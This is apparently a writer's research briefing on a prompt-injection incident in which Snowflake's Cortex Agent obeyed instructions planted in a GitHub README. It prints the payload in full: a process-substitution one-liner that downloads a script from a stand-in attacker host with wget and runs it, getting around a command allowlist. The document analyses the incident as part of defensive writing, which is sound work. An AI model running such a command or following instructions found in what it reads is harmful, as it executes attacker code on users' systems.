## 1. Snowflake Cortex AI Escapes Sandbox — Prompt Injection in Production

**Status:** New production incident, documented March 18 by Simon Willison via PromptArmor report.

Snowflake's Cortex Agent was compromised through a prompt injection chain. The attack:

1. Attacker embeds malicious instructions in a GitHub repository's README.
2. User asks Cortex to review the repository.
3. Cortex reads the README, executes the injected instructions.
4. The payload uses process substitution to escape the command allowlist:

   ```
   cat < <(sh < <(wget -q0- https://ATTACKER_URL.com/bugbot))
   ```

   `cat` was on the allowlist. Process substitution was not accounted for. The command runs arbitrary attacker-controlled code.

Snowflake patched the vulnerability. The underlying problem — that command allowlists do not bound what an agent can execute — is not patched.

**Willison's assessment:** "Inherently unreliable." He advocates for deterministic sandboxes that operate outside the agent layer itself, treating any agent command as capable of executing anything its underlying process permits. His framing is close to the book's execution security chapter argument: the boundary must be architectural, not policy-based.

**Relevance:** High. Three connections to existing book content:

- **Execution Security** (chapters/execution-security.md): The allowlist-as-defense pattern fails here exactly as the chapter describes. Containment must be by design. The Cortex incident is a production counterexample to the "we have an allowlist" defense.
- **Can't vs. Don't** (drafts/cant-vs-dont.md, pending verification): The thesis is that policy fails where architecture holds. Snowflake had policy (allowlist). The attacker bypassed it with architecture (process substitution). The chapter needs this incident.
- **Tool Security and MCP Poisoning** (chapters/tool-security.md): The attack surface mirrors the MCP README injection pattern — malicious content in a source the agent is expected to read. Same class of attack, different runtime.

**Actionable:**
- Add to cant-vs-dont.md (if it clears verification before publication) or to execution-security.md gap notes.
- RSAC timing: PromptArmor will likely present or reference this at RSAC 2026 (March 23-26). Watch for follow-up research.

## Summary for Shane

One blog post idea, time-sensitive:

**"Process Substitution Just Broke Snowflake's AI Allowlist"**

- Working title: *Why the Agent Allowlist Is Not a Security Boundary*
- Why now: Snowflake patched this March 18. The PromptArmor report is public. Simon Willison documented it. The fix closed the specific instance but not the pattern: `cat` was safe until it wasn't, because the agent layer has no architectural containment. The timing is perfect — RSAC opens March 23 and agent security is the conference theme. A post published March 20-22 lands in practitioners' feeds the week they're thinking hardest about this.
- Shane's angle: The allowlist represents the "don't" approach — a policy rule about which commands are permitted. Process substitution bypasses it without breaking the rule; `cat` was called. The "can't" alternative is deterministic sandboxing: the process literally cannot execute outside its container, regardless of what the agent calls. Willison's framing and Shane's framing converge on the same conclusion from different directions. The post writes itself.
